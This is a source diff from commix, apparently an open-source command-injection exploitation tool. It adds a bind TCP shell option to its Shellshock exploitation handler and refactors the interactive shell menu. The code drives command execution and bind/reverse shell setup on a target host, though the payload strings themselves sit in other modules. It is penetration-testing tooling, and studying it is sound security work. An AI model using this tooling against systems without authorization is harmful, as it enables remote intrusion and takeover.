@@ -14,6 +14,7 @@ from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
+from src.core.shells import bind_tcp
 from src.core.shells import reverse_tcp
 from src.core.requests import parameters
 from src.core.injections.controller import checks
@@ -502,7 +503,120 @@ def file_access(url, cve, check_header, filename):
 
   if settings.FILE_ACCESS_DONE == True:
     print ""
-    
+
+"""
+Execute the bind / reverse TCP shell
+"""
+def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
+
+  shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+  if settings.VERBOSITY_LEVEL >= 1:
+    print ""
+
+  err_msg = "The " + os_shell_option.split("_")[0] + " "
+  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed!"
+  print settings.print_critical_msg(err_msg)
+
+"""
+Configure the bind TCP shell
+"""
+def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
+
+  settings.BIND_TCP = True
+  # Set up RHOST / LPORT for the bind TCP connection.
+  bind_tcp.configure_bind_tcp()
+
+  if settings.BIND_TCP == False:
+    if settings.REVERSE_TCP == True:
+      os_shell_option = "reverse_tcp"
+      reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
+    return go_back, go_back_again
+
+  while True:
+    if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
+      result = checks.check_bind_tcp_options(settings.RHOST)
+
+    else:  
+      cmd = bind_tcp.bind_tcp_options()
+      result = checks.check_bind_tcp_options(cmd)
+    if result != None:
+      if result == 0:
+        return False
+      elif result == 1 or result == 2:
+        go_back_again = True
+        settings.BIND_TCP = False
+      return go_back, go_back_again
+
+    # execute bind TCP shell 
+    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
+
+"""
+Configure the reverse TCP shell
+"""
+def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
+
+  settings.REVERSE_TCP = True
+  # Set up LHOST / LPORT for the reverse TCP connection.
+  reverse_tcp.configure_reverse_tcp()
+
+  if settings.REVERSE_TCP == False:
+    if settings.BIND_TCP == True:
+      os_shell_option = "bind_tcp"
+      bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
+    return go_back, go_back_again
+
+  while True:
+    if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
+      result = checks.check_reverse_tcp_options(settings.LHOST)
+    else:  
+      cmd = reverse_tcp.reverse_tcp_options()
+      result = checks.check_reverse_tcp_options(cmd)
+    if result != None:
+      if result == 0:
+        return False
+      elif result == 1 or result == 2:
+        go_back_again = True
+        settings.REVERSE_TCP = False
+      return go_back, go_back_again
+
+    # execute bind TCP shell 
+    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
+
+"""
+Check commix shell options
+"""
+def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
+
+  if os_shell_option == False:
+    if no_result == True:
+      return False
+    else:
+      return True 
+
+  # The "back" option
+  elif os_shell_option == "back":
+    go_back = True
+    return go_back, go_back_again
+
+  # The "os_shell" option
+  elif os_shell_option == "os_shell": 
+    warn_msg = "You are already into the '" + os_shell_option + "' mode."
+    print settings.print_warning_msg(warn_msg)+ "\n"
+
+  # The "bind_tcp" option
+  elif os_shell_option == "bind_tcp":
+    go_back, go_back_again = bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
+    return go_back, go_back_again
+
+  # The "reverse_tcp" option
+  elif os_shell_option == "reverse_tcp":
+    go_back, go_back_again = reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
+    return go_back, go_back_again
+
+  # The "quit" option
+  elif os_shell_option == "quit":                    
+    sys.exit(0)
+
 """
 The main shellshock handler
 """
@@ -652,8 +766,8 @@ def shellshock_handler(url, http_request_method, filename):
                   checks.no_readline_module()
                 while True:
                   try:
-                    # Tab compliter
                     if not readline_error:
+                      # Tab compliter
                       readline.set_completer(menu.tab_completer)
                       # MacOSX tab compliter
                       if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
@@ -663,46 +777,13 @@ def shellshock_handler(url, http_request_method, filename):
                         readline.parse_and_bind("tab: complete")
                     cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
+                    
                     if cmd.lower() in settings.SHELL_OPTIONS:
                       os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
-                      if os_shell_option == False:
-                        if no_result == True:
-                          return False
-                        else:
-                          return True 
-                      elif os_shell_option == "quit":                    
-                        sys.exit(0)
-                      elif os_shell_option == "back":
-                        go_back = True
-                        break
-                      elif os_shell_option == "os_shell": 
-                          warn_msg = "You are already into the '" + os_shell_option + "' mode."
-                          print settings.print_warning_msg(warn_msg)+ "\n"
-                      elif os_shell_option == "reverse_tcp":
-                        # Set up LHOST / LPORT for The reverse TCP connection.
-                        reverse_tcp.configure_reverse_tcp()
-                        while True:
-                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
-                            result = checks.check_reverse_tcp_options(settings.LHOST)
-                          else:  
-                            cmd = reverse_tcp.reverse_tcp_options()
-                            result = checks.check_reverse_tcp_options(cmd)
-                          if result != None:
-                            if result == 0:
-                              return False
-                            elif result == 1 or result == 2:
-                              go_back_again = True
-                              settings.REVERSE_TCP = False
-                              break
-                          # Command execution results.
-                          shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-                          if settings.VERBOSITY_LEVEL >= 1:
-                            print ""
-                          err_msg = "The reverse TCP connection has failed!"
-                          print settings.print_critical_msg(err_msg)
-                      else:
-                        pass
+                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
 
+                      if go_back:
+                        break
                     else: 
                       shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                       if shell != "":
